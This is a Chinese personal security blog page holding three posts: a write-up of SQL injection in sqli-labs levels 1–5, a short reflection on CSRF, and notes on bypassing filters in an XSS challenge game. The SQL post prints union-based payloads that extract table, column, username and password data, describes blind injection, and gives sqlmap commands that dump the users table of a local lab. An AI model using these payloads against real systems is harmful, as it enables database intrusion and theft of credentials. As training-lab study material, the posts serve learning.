sqli labs(1-5)小结

发表于 2019-01-03

sql注入是常见的漏洞类型之一，所以最近就来玩玩sql注入了，DVWA里面的可以先简单熟悉一下SQL注入的操作，然后就可以来刷sqli-labs的题了，
磨练绕过技巧就靠这个玩意儿了。（注以下的一个减号其实是两个）

PART 1（手工注入）


先来看看sqli-labs第一题
首先测试可用参数id是什么类型的注入，我们先随便输入一个id=1，得到数据库里面的数据，也就是说这是最基本的回显sql注入。

id=1’

这时候sql报错了，通过报错的提示，我们可以知道，这是一个字符型（‘’）的注入，因此，先将单引号放在那里闭合原有的参数，在用–+（+代替空格）
来闭合后面的单引号。
这时候sql语句就变成了

select * from users where id=’1’[这里插入payload]–+’(省略)

的这种结构，因此先用order by （数字）爆字段数这里测试结果为3，即我们要保证select语句中有三个参数.然后就是确定回显的参数是什么了，由前面

我们的输入id=1时回显了两行数据，可以知道有两个字段能够回显。
这时候我们用

id=1000’+union+select+1,2,3–+

来判断回显参数，由结果可知后面两个参数能够回显，因此我们得到数据库的内容也主要从后面两个参数下手；
随后：爆表名

id=1000’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()–+


接着：爆列名

id=1000’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=”users”–+

最后：爆值

id=1000’ union select 1,group_concat(username),group_concat(password) from users–+


这就是第一道sqli-labs的思路和过程了,后面几道题的思路和方法都和第一道大同小异，区别只是可控参数的类型不一样，比如第二道的参数类型就是数字型，
这里提提第三道题，可控参数实际上是

id=(‘[GET的内容]’)

第四道题的闭合方式和第三道类似，只是需要将’改成”而已。其余的payload和第一道题类似，这里不一一赘述了。
第五道题开始就没有回显注入了，而是来到了SQL盲注的大门，我们按照回显注入的方式输入

id=1


发现没有回显数据，而是一串字符，但是这道题还算良心用经典方法

id=1’

发现还是’型的注入，这时候我们故意构造一个错误的语句，看看回显的是什么

id=1’+and+1=2–+

id=1’and+’1’=’2’–+

以上都可以得到错误的结果，这个语句要求前后都为真时才会返回数据，故意构造错误的语句是为了构造布尔型盲注，输入上面的payload之后我们可以将这个界面

看作假，将输入id=1（YOU ARE IN…..）看作真，这样我们就可以判断我们输入的payload是否奏效了。下面演示猜解数据表名称（上图）



这样我们就可以得到数据库名称的首字符的ASCII码值是115也就是s，依次类推能够得到数据库的名称。相似的我们也可以构造时间延迟型盲注。

以上代码能够在第一个参数为真时，返回第二个参数（sleep(5)–休眠5秒）
为假时返回第三个参数（1）；
通过页面响应的时间我们就能够判断参数1是否成立，因此也可以采用这种方式进行数据库的猜解。但这样猜解太过麻烦了，因此我们需要用sqlmap这一神器进行自动
注入。

PART 2(自动注入):


首先先使用
python sqlmap.py -u “http://localhost/sql/Less-5/?id=1" -p “id” –current-db

查询当前数据库名称


随后再用
python sqlmap.py -u “http://localhost/sql/Less-5/?id=1" -p “id” -D security –tables

查询该数据库下的表名


然后知道表名，按照流程来查列名
python sqlmap.py -u “http://localhost/sql/Less-5/?id=1" -p “id” -D security -T users –columns

得到列名，就可以开始查值了


最后我们来爆值
python sqlmap.py -u “http://localhost/sql/Less-5/?id=1" -p “id” -D security -T users -C “id,username,password” –dump

关于CSRF的一点想法

发表于 2018-12-11

刚刚学了一点CSRF漏洞的应用方法，难怪目前都很少有网站存在CSRF漏洞了，由于我们利用CSRF攻击的是其他用户，因此当这些用户出现校验属性的时候，这个漏洞就会显得比较无力，
我们必须与其他漏洞相结合，来获取用户校验属性的值，否则很难构造一个合适的表单，来发送自己想要达成的跨域请求，注入改密码这种敏感操作，各个网站之间都会运用输入原始
密码或者进行邮件校验来防止CSRF攻击，起码目前的CSRF确实很难利用他进行敏感操作了，但起码目前熟悉了CSRF攻击的过程，也熟悉了伪造表单的过程，一些参数的设置或者对


元素的理解，都还是深刻了一些，总之还是觉得有好处的。

xss小结1

发表于 2018-12-03

最近还是做了一些xss绕过类型的题目，总体来说还是比较简单的（对于大佬来说），
但对于初学者的我还是有一些小小的心得的，于是就来分享一下了，
题目是从网络下载的，感谢这位大佬做的XSS小游戏。

先来试试直接使用居然就直接弹窗了，果然是level 1


根本就没有对输入进行任何过滤直接插标签就对了，这个源码也说明了游戏的通关方式，
上面改写了alert（）函数，这个函数作用在于当成功调用alert( %}，
后会弹出一个带确定和取消的提示框，并且跳转到下一个界面，
也就是level 2，所以弹窗就对了。
然后我们就顺利来到了level 2了
看了一下网页源码，是构造了一个表单，
这个表单从input标签中得到字符串，并加入到value属性里，
我们可以像这幅图一样通过”将前面value值闭合掉，在后面插入我们自己的事件进行弹窗。


不过我这里用的是onmouseover这个时间（简便易触发）。下面就是level 3啦。
（自带分割线）
起初搞了半天闭合也试了，构造新的标签也试了就是没有任何作用，
后来通过百度的力量和查源码，原来把我输入的内容全部当作html实体编码了,其实输入
之后浏览器反馈的内容也在提示这一点。

所以要想办法绕过实体编码，经过测试和查资料发现’和`（单引号和反引号）似乎可以做到这一点，
在keyword后面输入单引号之后，发现我们输入的内容跳出了value值了，
这时我们再试试插入onmouseover事件看看。

随后我们将鼠标移上去，大功告成。

进入了level 4我发现刚开始我可以不要好高骛远，
可以查源码绕，然后就来无耻的查源码啦，源码显示将我们的尖括号，
替换成了空字符，而对事件没有任何的限制

这里就非常简单了，我们依然闭合前面value的值，并且插入自己的事件即可过关。

到了level 5了，老样子先查看源码。
能看出我们的script标签和on中间被加上了_
试了试大小写混合行不通，那就不用这两个即可

我们这里可以选择使用javascript伪协议进行绕过了，
